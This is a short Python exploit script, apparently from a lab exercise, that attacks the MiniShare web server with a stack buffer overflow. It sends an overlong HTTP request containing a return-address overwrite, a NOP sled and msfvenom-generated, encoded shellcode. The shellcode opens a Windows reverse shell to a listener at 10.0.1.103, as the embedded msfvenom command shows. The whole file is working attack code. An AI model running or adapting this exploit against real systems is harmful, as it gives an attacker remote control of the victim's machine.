#!/usr/bin/python
#by Anakein
#Date: 01/04/2019
import socket
import struct
import subprocess

headers = """GET / HTTP/1.1\r\n
Host: minishare.com\r\n\r\n"""

crash = 3000
offset = 1791
retadd = struct.pack('<L',0x7e429353)  # USER32.dll

#msfvenom -p windows/shell_reverse_tcp LHOST=10.0.1.103 LPORT=6464 -e x86/shikata_ga_nai -b "\x00\x0d" -f python EXITFUNC=thread
buf = '\x41'*offset
buf += retadd
buf += '\x90'*17
buf += "\xd9\xf6\xbd\x30\x95\x3a\xf4\xd9\x74\x24\xf4\x5f\x29"
buf += "\xc9\xb1\x52\x83\xef\xfc\x31\x6f\x13\x03\x5f\x86\xd8"
buf += "\x01\x63\x40\x9e\xea\x9b\x91\xff\x63\x7e\xa0\x3f\x17"
buf += "\x0b\x93\x8f\x53\x59\x18\x7b\x31\x49\xab\x09\x9e\x7e"
buf += "\x1c\xa7\xf8\xb1\x9d\x94\x39\xd0\x1d\xe7\x6d\x32\x1f"
buf += "\x28\x60\x33\x58\x55\x89\x61\x31\x11\x3c\x95\x36\x6f"
buf += "\xfd\x1e\x04\x61\x85\xc3\xdd\x80\xa4\x52\x55\xdb\x66"
buf += "\x55\xba\x57\x2f\x4d\xdf\x52\xf9\xe6\x2b\x28\xf8\x2e"
buf += "\x62\xd1\x57\x0f\x4a\x20\xa9\x48\x6d\xdb\xdc\xa0\x8d"
buf += "\x66\xe7\x77\xef\xbc\x62\x63\x57\x36\xd4\x4f\x69\x9b"
buf += "\x83\x04\x65\x50\xc7\x42\x6a\x67\x04\xf9\x96\xec\xab"
buf += "\x2d\x1f\xb6\x8f\xe9\x7b\x6c\xb1\xa8\x21\xc3\xce\xaa"
buf += "\x89\xbc\x6a\xa1\x24\xa8\x06\xe8\x20\x1d\x2b\x12\xb1"
buf += "\x09\x3c\x61\x83\x96\x96\xed\xaf\x5f\x31\xea\xd0\x75"
buf += "\x85\x64\x2f\x76\xf6\xad\xf4\x22\xa6\xc5\xdd\x4a\x2d"
buf += "\x15\xe1\x9e\xe2\x45\x4d\x71\x43\x35\x2d\x21\x2b\x5f"
buf += "\xa2\x1e\x4b\x60\x68\x37\xe6\x9b\xfb\x32\xf7\xa2\x9c"
buf += "\x2a\xf5\xa4\x7b\xeb\x70\x42\x11\xfb\xd4\xdd\x8e\x62"
buf += "\x7d\x95\x2f\x6a\xab\xd0\x70\xe0\x58\x25\x3e\x01\x14"
buf += "\x35\xd7\xe1\x63\x67\x7e\xfd\x59\x0f\x1c\x6c\x06\xcf"
buf += "\x6b\x8d\x91\x98\x3c\x63\xe8\x4c\xd1\xda\x42\x72\x28"
buf += "\xba\xad\x36\xf7\x7f\x33\xb7\x7a\x3b\x17\xa7\x42\xc4"
buf += "\x13\x93\x1a\x93\xcd\x4d\xdd\x4d\xbc\x27\xb7\x22\x16"
buf += "\xaf\x4e\x09\xa9\xa9\x4e\x44\x5f\x55\xfe\x31\x26\x6a"
buf += "\xcf\xd5\xae\x13\x2d\x46\x50\xce\xf5\x66\xb3\xda\x03"
buf += "\x0f\x6a\x8f\xa9\x52\x8d\x7a\xed\x6a\x0e\x8e\x8e\x88"
buf += "\x0e\xfb\x8b\xd5\x88\x10\xe6\x46\x7d\x16\x55\x66\x54"
buf += '\x43'*(crash-offset-4-17-351)
buffer = buf
s  = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('10.0.1.123', 80))
s.send(buffer)
s.send(headers)
s.recv(1024)
s.close()
